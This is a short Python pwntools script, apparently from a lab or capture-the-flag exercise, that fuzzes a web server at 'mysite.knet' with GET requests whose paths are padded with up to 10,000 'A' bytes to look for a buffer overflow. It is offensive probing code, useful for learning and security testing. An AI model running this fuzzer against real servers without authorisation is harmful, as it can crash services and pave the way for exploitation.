#!/usr/bin/env python
from pwn import *

host = "mysite.knet"
port = 80

method = b"GET /"
buf = b""
header = b" HTTP/1.1\r\n"
header += b"Host: mysite.knet\r\n"
header += b"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\n"
header += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
header += b"Accept-Language: en-US,en;q=0.5\r\n"
header += b"Accept-Encoding: gzip, deflate\r\n"
header += b"Connection: keep-alive\r\n"
header += b"Upgrade-Insecure-Requests: 1\r\n"
header += b"Cache-Control: max-age=0\r\n"
crlf = b"\r\n\r\n"

for n in (0,100,500,1000,2000,3000,4000,5000,6000,7000,8000,9000,10000):
    print("============================")
    print("SIZE: " + str(n))
    print("============================")

    s = socket.socket()

    buf = b"A" * n
    payload = method + buf + header + crlf

    print(f"REQUEST: \n")
    print(payload.decode())

    s.connect((host,port))
    s.send(payload)

    print("RESPONSE: \n")
    r = remote.fromsocket(s)
    print(r.recv().decode())
